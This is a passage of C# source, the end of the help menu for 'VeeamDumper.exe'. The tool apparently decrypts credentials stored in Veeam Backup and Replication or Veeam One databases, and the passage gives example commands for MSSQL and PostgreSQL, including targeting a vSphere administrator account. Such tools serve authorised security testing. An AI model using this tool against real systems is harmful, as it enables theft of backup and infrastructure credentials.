            Console.WriteLine("  -u <username>    Decrypt credentials for only a specific user in the database");
            Console.WriteLine("  -o               Target Veeam One instead of Veeam Backup and Replication");
            Console.WriteLine("  -d               Enable debug output for all steps");
            Console.WriteLine("  -h, --help       Show this help menu");
            Console.WriteLine();
            Console.WriteLine("Examples:");
            Console.WriteLine("  VeeamDumper.exe enum");
            Console.WriteLine("  VeeamDumper.exe auto");
            Console.WriteLine("  VeeamDumper.exe auto -s \".\\VEEAMSQL2016\"");
            Console.WriteLine("  VeeamDumper.exe mssql");
            Console.WriteLine("  VeeamDumper.exe mssql -s \".\\VEEAMSQL2016\"");
            Console.WriteLine("  VeeamDumper.exe mssql -s \"SERVERNAME\\VEEAMSQL2016\" -v VeeamBackup");
            Console.WriteLine("  VeeamDumper.exe mssql -l");
            Console.WriteLine("  VeeamDumper.exe mssql -o");
            Console.WriteLine("  VeeamDumper.exe mssql -o -s \".\\VEEAMSQL2016\"");
            Console.WriteLine("  VeeamDumper.exe mssql -u \"administrator@vsphere.local\"");
            Console.WriteLine("  VeeamDumper.exe mssql -v VeeamBackup2017 -m \"C:\\Tools\\sqlcmd.exe\" -d");
            Console.WriteLine("  VeeamDumper.exe psql");
            Console.WriteLine("  VeeamDumper.exe psql -l");
            Console.WriteLine("  VeeamDumper.exe psql -u \"administrator@vsphere.local\"");
            Console.WriteLine("  VeeamDumper.exe psql -v VeeamBackup2016 -p \"C:\\PostgreSQL\\15\\bin\\psql.exe\" -d");
            Console.WriteLine("  VeeamDumper.exe map");
            Console.WriteLine("  VeeamDumper.exe map -o");
            Console.WriteLine("  VeeamDumper.exe map -s \".\\VEEAMSQL2016\"");
        }
    }
}
